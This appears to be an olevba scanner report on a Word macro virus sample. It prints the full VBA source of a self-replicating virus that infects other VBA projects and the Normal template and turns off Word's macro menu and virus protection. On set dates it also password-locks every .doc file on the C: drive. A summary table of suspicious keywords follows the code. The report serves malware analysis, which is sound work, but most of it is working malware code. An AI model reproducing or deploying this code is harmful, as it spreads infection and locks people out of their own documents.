olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.d-22f9dff375ad8c5917be5dd226655985fd2481b2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Claudio2.cls 
in file: Virus.MSWord.Eight941.d-22f9dff375ad8c5917be5dd226655985fd2481b2 - OLE stream: 'Macros/VBA/Claudio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




























































Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
   If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        Next i
    End If
End If
End Sub


Private Sub Document_close()
On Error Resume Next
Dim jota As Integer, i As Integer, y As Integer, cadecodi As String
 Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
 Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
  CommandBars("tools").Controls("macro").Enabled = False
  Options.VirusProtection = False
  y = 0
  If AD.Name = "Claudio2" Then GoTo InfectNormal
  i = NT.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
Claudio:
  jota = 0
  jota = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < NT.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = NT.CodeModule.Lines(jota, 1)
     AD.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   AD.Name = "Claudio2"
   ActiveDocument.SaveAs ActiveDocument.FullName
  Else
    AD.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo Claudio
  End If
 GoTo IYGH
InfectNormal:
If NT.Name <> "Claudio2" Then
i = AD.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
jota = 0
jota = NT.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc)
  If jota = 0 Then
   jota = i
   Do While y < AD.CodeModule.ProcCountLines("Document_Close", vbext_pk_Proc)
     y = y + 1
     cadecodi = AD.CodeModule.Lines(jota, 1)
     NT.CodeModule.InsertLines y, cadecodi
     jota = jota + 1
   Loop
   NT.Name = "Claudio2"
   NormalTemplate.Save
  Else
    NT.CodeModule.ReplaceLine jota, "Sub Claudio"
    GoTo InfectNormal
  End If
 End If
IYGH:
'Este es un V macro, Elaborado por c l a u d I o
'Este es el Comienzo de la era de los V Claudio
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

